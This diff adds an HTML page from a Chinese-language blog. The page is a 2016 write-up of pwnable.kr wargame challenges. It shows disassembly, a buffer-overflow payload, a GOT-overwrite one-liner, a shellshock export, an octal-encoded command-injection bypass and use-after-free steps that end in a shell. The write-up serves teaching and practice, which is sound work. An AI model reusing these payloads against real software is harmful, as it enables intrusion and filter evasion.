@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Pwnable.kr | Chu&#39;s BLoG</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="和糖果师傅学 Linux Exploit，发现 pwnable.kr 上面的题目很有趣，边学边做。
+1. fd考察的是 Linux 文件描述符相关知识：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwnable.kr">
+<meta property="og:url" content="http://sh3ll.me/2016/03/28/pwnable-kr-writeup/index.html">
+<meta property="og:site_name" content="Chu's BLoG">
+<meta property="og:description" content="和糖果师傅学 Linux Exploit，发现 pwnable.kr 上面的题目很有趣，边学边做。
+1. fd考察的是 Linux 文件描述符相关知识：">
+<meta property="og:updated_time" content="2016-07-16T09:12:50.038Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Pwnable.kr">
+<meta name="twitter:description" content="和糖果师傅学 Linux Exploit，发现 pwnable.kr 上面的题目很有趣，边学边做。
+1. fd考察的是 Linux 文件描述符相关知识：">
+  
+    <link rel="alternative" href="/atom.xml" title="Chu&#39;s BLoG" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  <link href="http://fonts.useso.com/css?family=Ubuntu" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  
+</head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Chu&#39;s BLoG</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">Talk is cheap, show me the shell.</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="sub-nav">
+        
+          <a id="nav-home-icon" class="nav-icon" href="/"></a>
+        
+          <a id="nav-archives-icon" class="nav-icon" href="/archives"></a>
+        
+          <a id="nav-about-icon" class="nav-icon" href="/about"></a>
+        
+          <a id="nav-links-icon" class="nav-icon" href="/links"></a>
+        
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+      </nav>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-pwnable-kr-writeup" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Pwnable.kr
+    </h1>
+  
+
+      </header>
+    
+    <time class="article-date" datetime="2016-03-28T12:06:52.000Z" itemprop="datePublished">03-28-2016</time>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Exploit/">Exploit</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>和糖果师傅学 Linux Exploit，发现 pwnable.kr 上面的题目很有趣，边学边做。</p>
+<h2 id="1-fd"><a href="#1-fd" class="headerlink" title="1. fd"></a>1. fd</h2><p>考察的是 Linux 文件描述符相关知识：<a id="more"></a></p>
+<blockquote>
+<p>fd == 0 为标准输入<br>fd == 1 为标准输出<br>fd == 2 为标准错误输出 </p>
+</blockquote>
+<p>将 argv[1] 减去 4660，read(fd)，然后比较字符串：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">⋊&gt; ~/p/1_fd ./fd 4660                                                                                     05:14:13</div><div class="line">LETMEWIN</div><div class="line">good job :)</div><div class="line">/bin/cat: flag: No such file or directory</div></pre></td></tr></table></figure>
+<h2 id="2-collision"><a href="#2-collision" class="headerlink" title="2. collision"></a>2. collision</h2><p>IDA F5 给出的代码很清晰，输入5个数，和为 0x21DD09EC：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">.data:0804A020                 public hashcode</div><div class="line">.data:0804A020 hashcode        dd 21DD09ECh            ; DATA XREF: main+97r</div><div class="line"></div><div class="line">    if ( strlen(argv[1]) == 20 )</div><div class="line">    &#123;</div><div class="line">      if ( check_password((int)argv[1]) == hashcode )</div><div class="line">      &#123;</div><div class="line">        system(&quot;/bin/cat flag&quot;);</div><div class="line">        result = 0;</div><div class="line">      &#125;</div><div class="line"></div><div class="line">int __cdecl check_password(int a1)</div><div class="line">&#123;</div><div class="line">  signed int i; // [sp+4h] [bp-Ch]@1</div><div class="line">  int v3; // [sp+8h] [bp-8h]@1</div><div class="line"></div><div class="line">  v3 = 0;</div><div class="line">  for ( i = 0; i &lt;= 4; ++i )</div><div class="line">    v3 += *(_DWORD *)(a1 + 4 * i);</div><div class="line">  return v3;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="3-bof"><a href="#3-bof" class="headerlink" title="3. bof"></a>3. bof</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.text:00000649                 lea     eax, [ebp+s]</div><div class="line">.text:0000064C                 mov     [esp], eax      ; s</div><div class="line">.text:0000064F                 call    gets</div><div class="line">.text:00000654                 cmp     [ebp+arg_0], 0CAFEBABEh</div><div class="line">.text:0000065B                 jnz     short loc_66B</div><div class="line">.text:0000065D                 mov     dword ptr [esp], offset command ; &quot;/bin/sh&quot;</div><div class="line">.text:00000664                 call    system</div><div class="line">.text:00000669                 jmp     short loc_677</div></pre></td></tr></table></figure>
+<p><code>func</code> 函数经典栈溢出，覆盖参数：”A” * (0x2C + 0x8) + pack(0x0CAFEBABE)</p>
+<h2 id="4-flag"><a href="#4-flag" class="headerlink" title="4. flag"></a>4. flag</h2><p><code>upx -d flag</code> 脱掉壳，strings 就可以看到 flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">⋊&gt; /tmp strings flag |grep -i upx                                                                         20:42:05</div><div class="line">UPX...? sounds like a delivery service :)</div></pre></td></tr></table></figure>
+<h2 id="5-passcode"><a href="#5-passcode" class="headerlink" title="5. passcode"></a>5. passcode</h2><p><code>scanf</code> 未使用 &amp; 传递指针，而是直接传递了变量，变量 <code>passcode1</code> 未初始化，导致函数 <code>welcome</code> 中的变量 <code>name（ebp-70h）</code> 最后 4 字节刚好可以覆盖 <code>passcode1（ebp-10h）</code>，造成任意地址的 4 字节写。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">.text:08048564 passcode1       = dword ptr -10h</div><div class="line">.text:08048564 passcode2       = dword ptr -0Ch</div><div class="line">.text:08048564</div><div class="line">.text:08048564                 push    ebp</div><div class="line">.text:08048565                 mov     ebp, esp</div><div class="line">.text:08048567                 sub     esp, 28h</div><div class="line">.text:0804856A                 mov     eax, offset format ; &quot;enter passcode1 : &quot;</div><div class="line">.text:0804856F                 mov     [esp], eax      ; format</div><div class="line">.text:08048572                 call    _printf</div><div class="line">.text:08048577                 mov     eax, offset aD  ; &quot;%d&quot;</div><div class="line">.text:0804857C                 mov     edx, [ebp+passcode1] ; scanf 忘记写 &amp;，参数2为新申请的变量</div><div class="line">.text:0804857C                                         ; 而新申请的变量未初始化，值为之前输入的 name</div><div class="line">.text:0804857C                                         ; 导致任意地址写</div><div class="line">.text:0804857F                 mov     [esp+4], edx</div><div class="line">.text:08048583                 mov     [esp], eax</div><div class="line">.text:08048586                 call    ___isoc99_scanf</div><div class="line">.text:0804858B                 mov     eax, ds:stdin@@GLIBC_2_0</div><div class="line">.text:08048590                 mov     [esp], eax      ; stream</div><div class="line">.text:08048593                 call    _fflush</div><div class="line">.text:08048598                 mov     eax, offset aEnterPasscode2 ; &quot;enter passcode2 : &quot;</div><div class="line">.text:0804859D                 mov     [esp], eax      ; format</div><div class="line">.text:080485A0                 call    _printf</div></pre></td></tr></table></figure>
+<p>覆写 <code>printf@got.plt</code> 为 <code>login ok</code> 部分，改变程序流程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">⋊&gt; ~/p/5_passcode python -c &apos;from pwn import *; print &quot;A&quot;*96+pack(0x804a000)+&quot;134514135&quot;&apos; |./passcode     06:04:16</div><div class="line">Toddler&apos;s Secure Login System 1.0 beta.</div><div class="line">enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!</div><div class="line">enter passcode1 : Login OK!</div><div class="line">Done!!!!!!!!</div><div class="line">Now I can safely trust you that you have credential :)</div></pre></td></tr></table></figure>
+<h2 id="6-random"><a href="#6-random" class="headerlink" title="6. random"></a>6. random</h2><p>调用 <code>random</code> 函数时未初始化种子，C 语言中用户未设定随机数种子时，系统默认的随机数种子为 1，导致返回值固定为 <code>1804289383</code>。</p>
+<h2 id="7-input"><a href="#7-input" class="headerlink" title="7. input"></a>7. input</h2><p>考察的是 C 语言中各种参数的传递，通过 C 编程解决：<a href="http://rickgray.me/2015/07/24/toddler-s-bottle-writeup-pwnable-kr.html" target="_blank" rel="external">http://rickgray.me/2015/07/24/toddler-s-bottle-writeup-pwnable-kr.html</a></p>
+<h2 id="8-leg"><a href="#8-leg" class="headerlink" title="8. leg"></a>8. leg</h2><p>考察 ARM 平台的调试，从来没有做过 ARM ：（，在师傅的指导下终于做出来了。在 ARM 中，r0 相当于 EAX 用作返回值，pc 相当于下面第二条指令的地址，lr 相当于函数返回地址 ret。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">key1</div><div class="line">   0x00008cdc &lt;+8&gt;: mov r3, pc</div><div class="line">   0x00008ce0 &lt;+12&gt;:    mov r0, r3</div><div class="line">   0x00008ce4 &lt;+16&gt;:    sub sp, r11, #0                 ； key1() = 0x00008ce4</div><div class="line">key2</div><div class="line">   0x00008d04 &lt;+20&gt;:    mov r3, pc</div><div class="line">   0x00008d06 &lt;+22&gt;:    adds    r3, #4</div><div class="line">   0x00008d08 &lt;+24&gt;:    push    &#123;r3&#125;</div><div class="line">   0x00008d0a &lt;+26&gt;:    pop &#123;pc&#125;</div><div class="line">   0x00008d0c &lt;+28&gt;:    pop &#123;r6&#125;        ; (ldr r6, [sp], #4)</div><div class="line">   0x00008d10 &lt;+32&gt;:    mov r0, r3                      ; key2() = 0x00008d08 + 4</div><div class="line">key3</div><div class="line">   0x00008d7c &lt;+64&gt;:    bl  0x8d20 &lt;key3&gt;</div><div class="line">   0x00008d80 &lt;+68&gt;:    mov r3, r0                      ; key3() = 0x00008d80</div><div class="line"></div><div class="line">/ $ ./leg </div><div class="line">Daddy has very strong arm! : 108400</div><div class="line">Congratz!</div><div class="line">My daddy has a lot of ARMv5te muscle!</div></pre></td></tr></table></figure>
+<h2 id="9-mistake"><a href="#9-mistake" class="headerlink" title="9. mistake"></a>9. mistake</h2><p>误用了 C 函数 open 的 mode 参数，在存在 mode 参数时，open 的返回值为：若所有欲核查的权限都通过了检查则返回 0 值, 表示成功, 只要有一个权限被禁止则返回 -1。所以 <code>fd == 0</code>，导致 pw_buf 从标准输入读入，在 IDA Pesudocode 中可以很清晰的看到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">if ( (signed int)read(0, &amp;buf, 10uLL) &gt; 0 )</div><div class="line">&#123;</div><div class="line">  printf(&quot;input password : &quot;, &amp;buf);</div><div class="line">  __isoc99_scanf(&quot;%10s&quot;, &amp;s2);</div><div class="line">  xor((__int64)&amp;s2, 10u);</div><div class="line">  if ( !strncmp(&amp;buf, &amp;s2, 0xAuLL) )</div><div class="line">  &#123;</div><div class="line">    puts(&quot;Password OK&quot;);</div><div class="line">    system(&quot;/bin/cat flag\n&quot;);</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
+<h2 id="10-shellshock"><a href="#10-shellshock" class="headerlink" title="10. shellshock"></a>10. shellshock</h2><p>shellshock 漏洞：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">shellshock@ubuntu:~$ ./bash </div><div class="line">shellshock@ubuntu:~$ export echo=&quot;() &#123; cat flag; &#125;&quot;</div><div class="line">shellshock@ubuntu:~$ ./shellshock </div><div class="line">only if I knew CVE-2014-6271 ten years ago..!!</div></pre></td></tr></table></figure>
+<h2 id="11-coin1"><a href="#11-coin1" class="headerlink" title="11. coin1"></a>11. coin1</h2><p><a href="https://zh.wikipedia.org/wiki/%E6%8A%98%E5%8D%8A%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95" target="_blank" rel="external">二分法</a> 成功解决。坑点：网络速度不够，脚本需要扔到服务器上面跑：（</p>
+<h2 id="12-blackjack"><a href="#12-blackjack" class="headerlink" title="12. blackjack"></a>12. blackjack</h2><p>TODO</p>
+<h2 id="13-lotto"><a href="#13-lotto" class="headerlink" title="13. lotto"></a>13. lotto</h2><p>TODO</p>
+<h2 id="14-cmd1"><a href="#14-cmd1" class="headerlink" title="14. cmd1"></a>14. cmd1</h2><p>shell 拼接字符串简单绕过：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cmd1@ubuntu:~$ ./cmd1 &quot;/bin/cat &apos;fl&apos;&apos;ag&apos;&quot;</div><div class="line">mommy now I get what PATH environment is for :)</div></pre></td></tr></table></figure>
+<h2 id="15-cmd2"><a href="#15-cmd2" class="headerlink" title="15. cmd2"></a>15. cmd2</h2><p>这题比上面的难了些，过滤了很多，通过 echo 的编码/转义搞定。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$ #shell ascii</div><div class="line">$ echo &apos;\0101&apos;</div><div class="line">A</div><div class="line"></div><div class="line">⋊&gt; ~ ipython                                                                                                                                                                 </div><div class="line"></div><div class="line">In [1]: from pwn import *</div><div class="line"></div><div class="line">In [2]: cmd = &quot;/bin/cat flag&quot;</div><div class="line"></div><div class="line">In [3]: print &quot;\\&quot;+&quot;\\&quot;.join([oct(i) for i in ordlist(cmd)])</div><div class="line">\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147</div><div class="line"></div><div class="line">cmd2@ubuntu:~$ ./cmd2 &apos;$(echo &quot;\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147&quot;)&apos;</div><div class="line">$(echo &quot;\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147&quot;)</div><div class="line">FuN_w1th_5h3ll_v4riabl3s_haha</div></pre></td></tr></table></figure>
+<h2 id="16-uaf"><a href="#16-uaf" class="headerlink" title="16. uaf"></a>16. uaf</h2><p>典型的 UAF 漏洞，注意：先 free man，再 free woman，alloc 时会先获取到 woman 的空间，然后才是 man 空间，所以应该两次 alloc。<br>通过覆写虚表指针为虚表指针 - 8 获取 shell。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">⋊&gt; /tmp ipython</div><div class="line"></div><div class="line">In [1]: from pwn import *</div><div class="line"></div><div class="line">In [2]: pack(0x401568)</div><div class="line">Out[2]: &apos;h\x15@\x00&apos;</div><div class="line"></div><div class="line">In [3]: with open(&apos;/tmp/123&apos;, &apos;w&apos;) as fd:</div><div class="line">   ...:     fd.write(pack(0x401568))</div><div class="line">   ...: </div><div class="line"></div><div class="line">⋊&gt; /tmp scp -P2222 123 uaf@pwnable.kr:/tmp/halo                                                                                                                                                                               14:22:26</div><div class="line">uaf@pwnable.kr&apos;s password: </div><div class="line">123                                                                                                                                                                                                 100%    4     0.0KB/s   00:00    </div><div class="line">⋊&gt; /tmp ssh uaf@pwnable.kr -p2222                                                                                                                                                                                             14:22:41</div><div class="line">uaf@pwnable.kr&apos;s password: </div><div class="line">Last login: Mon Apr 11 23:09:42 2016 from 113.140.11.121</div><div class="line">uaf@ubuntu:~$ ./uaf 24 /tmp/halo</div><div class="line">1. use</div><div class="line">2. after</div><div class="line">3. free</div><div class="line">3</div><div class="line">1. use</div><div class="line">2. after</div><div class="line">3. free</div><div class="line">2</div><div class="line">your data is allocated</div><div class="line">1. use</div><div class="line">2. after</div><div class="line">3. free</div><div class="line">2</div><div class="line">your data is allocated</div><div class="line">1. use</div><div class="line">2. after</div><div class="line">3. free</div><div class="line">1</div><div class="line">$ id</div><div class="line">uid=1069(uaf) gid=1069(uaf) egid=1070(uaf_pwn) groups=1069(uaf)</div><div class="line">$ ls</div><div class="line">flag  uaf  uaf.cpp</div><div class="line">$ cat flag</div><div class="line">yay_f1ag_aft3r_pwning</div></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a href="http://sh3ll.me/2016/03/28/pwnable-kr-writeup/#disqus_thread" class="article-comment-link">Comments</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2016/04/06/learn-nodejs-portscan/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Learn Node.js
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2015/09/28/nsctf-bin-1500/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">NSCTF Bin 1500</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<section id="comments">
+  <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+</section>
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2016 Chu<br>
+      <a href="https://github.com/steven5538/hexo-theme-athena" target="_blank">Athena</a> by <a href="http://steven5538.tw" target="_blank">Steven5538</a> | Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> | <script src="http://s11.cnzz.com/z_stat.php?id=1254610758&web_id=1254610758" language="JavaScript"></script>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+<script>
+  var disqus_shortname = 'sh3ll';
+  
+  var disqus_url = 'http://sh3ll.me/2016/03/28/pwnable-kr-writeup/';
+  
+  (function(){
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//go.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+
+<script src="http://libs.baidu.com/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+  </div>
+</body>
+</html>
